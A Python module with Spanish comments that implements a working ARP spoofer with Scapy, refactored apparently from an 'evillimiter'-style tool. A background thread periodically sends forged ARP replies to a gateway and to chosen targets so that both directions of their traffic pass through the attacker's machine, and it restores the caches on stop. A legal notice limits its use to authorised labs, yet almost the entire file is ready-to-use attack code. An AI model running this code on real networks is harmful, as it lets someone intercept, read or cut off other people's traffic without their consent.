"""Envenenamiento ARP dirigido para ejercicios de laboratorio autorizados.

ADVERTENCIA LEGAL
-----------------
Este módulo falsifica respuestas ARP para que los equipos objetivo envíen su
tráfico hacia esta máquina. Úsese ÚNICAMENTE en redes propias o con
autorización expresa por escrito. Al detenerse, restaura las tablas ARP de los
objetivos a su estado correcto.

Es una refactorización del escolar ``ARPSpoofer`` original: sin dependencias de
``evillimiter`` ni de un modelo ``Host`` externo, seguro frente a hilos y con
restauración garantizada en ``stop()``.
"""

from __future__ import annotations

import threading
import time
from dataclasses import dataclass

from scapy.all import ARP, Ether, sendp  # type: ignore[import-untyped]

#: MAC de difusión.
BROADCAST = "ff:ff:ff:ff:ff:ff"

#: ARP opcode 2 = "is-at" (respuesta), el que se usa para envenenar la caché.
_ARP_REPLY = 2


@dataclass(frozen=True)
class Target:
    """Equipo objetivo: su IP y su MAC real (desacoplado de ``Device``)."""

    ip: str
    mac: str


class ARPSpoofer:
    """Envía respuestas ARP falsas a un conjunto de objetivos en segundo plano.

    Por cada objetivo envía dos paquetes periódicamente:

    * al gateway, diciéndole que la IP del objetivo está en nuestro MAC;
    * al objetivo, diciéndole que la IP del gateway está en nuestro MAC.

    Así ambos sentidos del tráfico pasan por esta máquina.
    """

    def __init__(
        self,
        interface: str,
        gateway_ip: str,
        gateway_mac: str,
        interval: float = 2.0,
    ) -> None:
        if interval <= 0:
            raise ValueError("interval debe ser positivo")
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.interval = interval

        self._targets: set[Target] = set()
        self._lock = threading.Lock()
        self._running = False
        self._thread: threading.Thread | None = None

    # --------------------------------------------------------- estado
    @property
    def running(self) -> bool:
        return self._running

    def targets(self) -> list[Target]:
        with self._lock:
            return sorted(self._targets, key=lambda target: target.ip)

    # ------------------------------------------------------ miembros
    def add(self, ip: str, mac: str) -> None:
        """Añade un objetivo al envenenamiento."""
        with self._lock:
            self._targets.add(Target(ip, mac.lower()))

    def remove(self, ip: str, restore: bool = True) -> None:
        """Quita un objetivo y, por defecto, restaura su caché ARP."""
        with self._lock:
            victim = next((target for target in self._targets if target.ip == ip), None)
            if victim is not None:
                self._targets.discard(victim)
        if victim is not None and restore:
            self._restore(victim)

    # ------------------------------------------------------- control
    def start(self) -> None:
        """Arranca el hilo de envenenamiento (idempotente)."""
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._run_loop, name="arp-spoof", daemon=True)
        self._thread.start()

    def stop(self, restore: bool = True) -> None:
        """Detiene el hilo y restaura las tablas ARP de todos los objetivos."""
        self._running = False
        thread = self._thread
        if thread is not None and thread.is_alive():
            thread.join(timeout=self.interval + 1.0)
        self._thread = None
        if restore:
            for target in self.targets():
                self._restore(target)
        with self._lock:
            self._targets.clear()

    # --------------------------------------------------------- hilo
    def _run_loop(self) -> None:
        while self._running:
            for target in self.targets():
                if not self._running:
                    return
                try:
                    self._send_spoofed(target)
                except OSError:
                    # Un fallo puntual de envío (p. ej. la interfaz parpadea) no
                    # debe tumbar el hilo: se reintenta en la siguiente vuelta.
                    continue
            # Dormir en tramos cortos para reaccionar rápido a ``stop``.
            slept = 0.0
            while self._running and slept < self.interval:
                time.sleep(0.1)
                slept += 0.1

    # ---------------------------------------------------- paquetes
    #
    # Importante: ARP es un protocolo de capa 2, así que se envía con ``sendp``
    # envuelto en una trama ``Ether``. Usar ``send`` (capa 3) con ``iface=`` falla
    # en Scapy moderno porque un ARP suelto no tiene campo ``dst`` de IP.
    # ``hwsrc`` de los paquetes de envenenamiento se deja sin fijar: Scapy lo
    # rellena con el MAC de la interfaz emisora (el nuestro), que es justo lo que
    # queremos anunciar.

    def _send_spoofed(self, target: Target) -> None:
        """Dos respuestas ARP falsas: una al gateway y otra al objetivo."""
        packets = [
            Ether(dst=self.gateway_mac)
            / ARP(op=_ARP_REPLY, psrc=target.ip, pdst=self.gateway_ip, hwdst=self.gateway_mac),
            Ether(dst=target.mac)
            / ARP(op=_ARP_REPLY, psrc=self.gateway_ip, pdst=target.ip, hwdst=target.mac),
        ]
        for packet in packets:
            sendp(packet, verbose=0, iface=self.interface)

    def _restore(self, target: Target) -> None:
        """Reanuncia las direcciones reales para reparar las cachés envenenadas."""
        packets = [
            Ether(dst=BROADCAST)
            / ARP(
                op=_ARP_REPLY,
                psrc=target.ip,
                hwsrc=target.mac,
                pdst=self.gateway_ip,
                hwdst=BROADCAST,
            ),
            Ether(dst=BROADCAST)
            / ARP(
                op=_ARP_REPLY,
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac,
                pdst=target.ip,
                hwdst=BROADCAST,
            ),
        ]
        for packet in packets:
            sendp(packet, verbose=0, iface=self.interface, count=3)
